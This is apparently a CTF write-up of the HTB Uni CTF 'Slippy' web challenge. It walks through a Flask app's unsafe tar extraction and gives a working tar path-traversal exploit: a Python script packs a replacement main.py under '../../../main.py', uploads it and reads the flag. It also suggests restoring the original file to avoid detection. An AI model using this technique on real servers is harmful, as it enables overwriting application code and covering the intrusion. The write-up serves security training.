---
title: "HTB UNI CTF : Web Slippy"
date: 2021-11-22T15:16:32-05:00
tags:
    - CTF-Writeups
---


![](/web_slippy/ChallengeDescription.png)


## Analyze
For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.

![](/web_slippy/Website.png)

The directory tree of the source code as follow.

```
./challenge
├── application
│   ├── blueprints
│   │   └── routes.py
│   ├── config.py
│   ├── main.py
│   ├── static
│   │   ├── archives
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   └── main.css
│   │   ├── images
│   │   │   ├── card-body2.png
│   │   │   ├── card-btm2.png
│   │   │   ├── card-top2.png
│   │   │   └── upload-doc.png
│   │   └── js
│   │       ├── bootstrap.min.js
│   │       ├── jquery-3.6.0.min.js
│   │       ├── main.js
│   │       └── TweenMax.min.js
│   ├── templates
│   │   └── index.html
│   └── util.py
├── flag
└── run.py
```

We can see that the flag file is in the same directory as the run.py

So I am assuming that we have to figure out a way to read the flag file.

***Util.py***
```
import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []

        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue

            os.makedirs(f'{extractdir}/{name}', exist_ok=True)

        tar.close()
        return extracted_filenames

    return False
```

This is the code that is used to extract the given tar file.

Let's examine this code a bit further.

```
generate = lambda x: os.urandom(x).hex()
```
It is used to generate a random number of the length x. Another way of writing this would be.

```
def generate(x):
	return os.urandom(x).hex()

```

```
		extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)
```

So here they use the generate to create a new folder to avoid files to collide when they have same name.


```
➜  application git:(main) ✗ cat config.py

from application.util import generate
from os.path import abspath

class Config(object):
    SECRET_KEY = generate(50)
    UPLOAD_FOLDER = '/app/application/static/archives'

class ProductionConfig(Config):
    pass

class DevelopmentConfig(Config):
    DEBUG = True

class TestingConfig(Config):
    TESTING = True

```

We can see that the tar file gets extracted at path `/app/application/static/archives/{somerandom}/`

We also know that the flag is at `/app/`


## Recon

https://bugzilla.redhat.com/show_bug.cgi?id=263261

By searching up on the internet, I found this cool bug in the tar file library in python.

After reading this for the first time, I thought I could use the `../../../flag` as my file name and the download the flag. Seems pretty simple right?

Well Not really.

The ```os.rename()``` overrides the existing file in the directory.

## Exploit

For the exploit, I thought of overriding the `main.py` file and adding a API endpoint that opens the flag and returns it.

```
rom flask import Flask, jsonify
from application.blueprints.routes import web, api

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found'}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400

@app.route('/flag')
def flag():
    file = open('/app/flag', 'r')
    return f.read()
```
This is what the new main file will look like.

If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won't figure out where we got the flag from.



```
import tarfile, requests

zpath = "../../../main.py"


tf = tarfile.open("payload.tar.gz", "w:gz")
tf.add('main.py', zpath)
tf.close()



url = "http://64.227.36.32:32187/api/unslippy"

files = {"file": open('payload.tar.gz', 'rb')}

r = requests.post(url, files=files)

flag = requests.get("http://64.227.36.32:32187/flag")

print(flag.text)
```

I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.

Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.

```
HTB{i_slipped_my_way_to_rce}
```

